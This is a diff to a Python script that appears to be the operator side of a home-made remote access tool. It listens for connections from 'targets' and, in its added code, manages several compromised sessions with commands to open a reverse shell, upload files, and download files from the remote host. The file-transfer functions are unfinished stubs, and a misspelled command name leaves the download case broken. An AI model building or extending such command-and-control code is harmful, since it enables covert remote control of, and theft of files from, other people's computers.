@@ -3,9 +3,13 @@ import json
 import sys
 import time
 import random
+import subprocess
+import threading
 
 HOST = "127.0.0.1" # Address to listen on
 PORT = 6969 # Port to listen on. (Better to use unprivileged ports)
+
+connections = list() # List of active connections 
 
 def send_command(conn, *args):
     """Send a command to the target"""
@@ -43,35 +47,68 @@ def shell(conn):
         cn.send(command.encode())
         time.sleep(1)
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
-    
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-    sock.bind((HOST, PORT))
+def upload_file(conn, local_path, remote_path):
+    print("\033[96m[INFO] Uploading the specified file...\033[0m")
+    # TODO: everything
+
+def download_file(conn, remote_path):
+    print("\033[96m[INFO] Retrieving the requested file...\033[0m")
+    send_command(conn, 'download', remote_path)
+
+    file = wait_response(conn) # TODO: to be finished...
+    
+def listen_for_connections(server):
+    """Continuously listen for new incoming connections"""
+    while True:
+        connection, address = server.accept()
+        print(f"\033[92m[INFO] Connection received from {address}\033[0m")
+        connections.append([connection, address]) # Appends the connection to the connections list
+
+
+if __name__ == '__main__':
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
     print(f"[INFO] Listening on {HOST}:{PORT}")
-    sock.listen(1) # Wait for an incoming connection
-    conn, addr = sock.accept() # Accept the connection. Store the connection and the IP address of the client connecting
-    with conn: 
-        print(f"\033[92m[INFO] Connection received from {addr}\n\033[0m")
+    server.listen(1)
+    # Starting a thread which continuously listens for new connections
+    threading.Thread(target=listen_for_connections, args=(server, )).start()
+    session = 0 # Current active session. Default is the first session
+    while True:
         while True:
             command = input("\033[1mCMD> \033[0m") # Request user command input
-            match command: # Parse user command input
-                case 'help':
+            parameters = command.split(' ')
+            match parameters[0]: # Parse user command input
+                case 'help': # Print an help message
                     print("""
                         \n<NOME DEL TOOL> 0.1
                         Usage: CMD> [command] [options]
 
                         COMMANDS:
+                            help: Displays this prompt
+                            sessions: Lists all the active sessions
+                            session <number>: Select the specified session
                             shell: Opens a reverse shell on the target
-                            upload <local_file>: Uploads a specified file (full local path)
+                            upload <local_file> <destination_path>: Uploads a specified file (full local path)
                             download <remote_file>: Downloads a file from the remote host\n
                         """)
+                case 'sessions': 
+                    i = 0
+                    for connection in connections: # Parse all the connections stored to list them
+                        print(f"{i} ---- {connection[1]} ----", "\033[92mcurrent" if i == session else " ")
+                        i += 1
+                case 'session':
+                    session = int(parameters[1])
+                    print(f"Selected session {session} on host {connections[session][1]}")
                 case 'shell':
-                    shell(conn)
-
-
+                    shell(connections[session][0])
+                case 'upload':
+                    upload_file(connections[session][0], parameters[1], parameters[2])
+                case 'downaload':
+                    download_file(connections[session][0], parameters[1])
 
 """
-Colors:
+Colors (to be removed...):
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKCYAN = '\033[96m'
